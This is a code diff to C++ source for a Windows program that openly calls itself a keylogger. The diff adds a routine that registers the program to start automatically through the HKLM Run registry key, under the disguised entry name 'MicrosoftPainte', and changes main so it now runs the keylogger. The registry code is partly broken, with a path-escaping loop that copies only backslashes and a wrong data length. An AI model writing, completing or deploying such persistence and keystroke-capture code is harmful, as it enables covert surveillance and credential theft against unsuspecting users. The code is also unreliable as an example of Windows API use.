@@ -1,23 +1,59 @@
 #include <iostream>
 #include <Windows.h>
+#include <fstream>
+#include <string>
 #include <chrono>
 #include <thread>
+
 using namespace std;
 
+void Issou()
+{
+
+
+}
 
 void SetRegisteryKey()
 {
-	HMODULE hModule = GetModuleHandle(NULL);
-	HKEY key = NULL;
-	char path[MAX_PATH];
+	string Path;
+	string newPath;
 
-	LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_READ, &key);
+	HMODULE hModule = NULL;
+	char path[MAX_PATH];
+	GetModuleFileNameA(
+		hModule,
+		path,
+		(sizeof(path))
+
+	);
+	Path = path;
+	for (int i = 0; i < Path.size(); i++)
+	{
+		if (path[i] == '\\')
+		{
+			newPath += path[i];
+			newPath += path[i];
+		}
+		else
+		{
+			
+		}
+	}
+
+	
+	HKEY key = NULL;
+	LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_READ, &key);
 	if (res == ERROR_SUCCESS) {
-		cout << "Bon ";
-		
+		res = RegSetValueEx(key,TEXT("MicrosoftPainte"),0,REG_SZ,reinterpret_cast<const BYTE*>(Path.c_str()),REG_SZ);
+		if (res == ERROR_SUCCESS) {
+			cout << "Sucess! \n";
+		}
+		else {
+			cout << "Error! \n";
+		}
 	}
 	else {
-		cout << "Pas bon ";
+		cout << "Pas bon \n";
 	}
 
 }
@@ -289,7 +325,6 @@ int main()
 {
 
 	system("title Keylogger");
-	// Keylogger()100;
 	SetRegisteryKey();
-	system("pause");
+	Keylogger(100);
 }
